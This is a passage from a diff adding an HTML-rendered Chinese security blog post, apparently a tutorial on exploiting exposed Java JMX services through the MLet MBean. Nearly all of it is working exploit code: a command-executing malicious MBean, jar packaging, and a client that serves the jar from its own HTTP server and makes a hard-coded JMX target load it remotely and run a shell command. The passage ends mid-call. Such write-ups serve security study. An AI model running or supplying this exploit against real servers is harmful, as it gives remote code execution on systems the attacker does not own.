+            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdInput&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;stdout_err_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;stdout_err_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+            &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;waitFor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout_err_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;将上述两个java文件编译后打包成jar包:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jar -cvf compromise.jar EvilMBean.class Evil.class
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;这会有版本问题，1.8.131 打包的在 1.7.80 用不了。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-利用代码&quot;&gt;0x02 利用代码&lt;/h2&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.sun.net.httpserver.HttpExchange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.sun.net.httpserver.HttpHandler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.sun.net.httpserver.HttpServer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.management.MBeanServerConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.management.ObjectInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.management.ObjectName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.management.remote.JMXConnector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.management.remote.JMXConnectorFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.management.remote.JMXServiceURL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.net.InetAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.net.InetSocketAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.HashSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.Iterator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/**
+ * Created by k1n9 on 2017/8/23.
+ */&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RemoteMbean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JARNAME&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;compromise.jar&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;OBJECTNAME&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;MLetCompromise:name=evil,id=1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;EVILCLASS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Evil&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        	&lt;span class=&quot;c1&quot;&gt;//开启Http服务，提供带mlet标签的html和恶意MBean的jar包&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;HttpServer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpServer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InetSocketAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4141&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;createContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/mlet&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MLetHandler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;createContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JARNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JarHandler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setExecutor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+			&lt;span class=&quot;c1&quot;&gt;//这里可以改成args的参数就可以在命令行下使用了，JMX的ip，端口，要执行的命令&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;connectAndOwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;10.18.224.59&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;2333&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+
+            &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;connectAndOwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        	&lt;span class=&quot;c1&quot;&gt;//建立连接&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;JMXServiceURL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JMXServiceURL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;service:jmx:rmi:///jndi/rmi://&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/jmxrmi&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;URL: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;, connecting&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+
+            &lt;span class=&quot;nc&quot;&gt;JMXConnector&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JMXConnectorFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connected: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getConnectionId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+
+            &lt;span class=&quot;nc&quot;&gt;MBeanServerConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMBeanServerConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+
+            &lt;span class=&quot;nc&quot;&gt;ObjectInstance&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;evil_bean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;evil_bean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getObjectInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;OBJECTNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;evil_bean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evil_bean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Trying to create bean...&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;ObjectInstance&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;evil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;evil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;createMBean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javax.management.loading.MLet&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;javax&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;management&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;InstanceAlreadyExistsException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;evil&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getObjectInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ObjectName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DefaultDomain:type=MLet&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+                &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Loaded &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;evil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+				&lt;span class=&quot;c1&quot;&gt;//调用 getMBeansFromURL 从远程服务器获取 MBean&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getObjectName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;getMBeansFromURL&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://%s:4141/mlet&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InetAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getLocalHost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getHostAddress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())},&lt;/span&gt;
+                        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()}&lt;/span&gt;
+                        &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
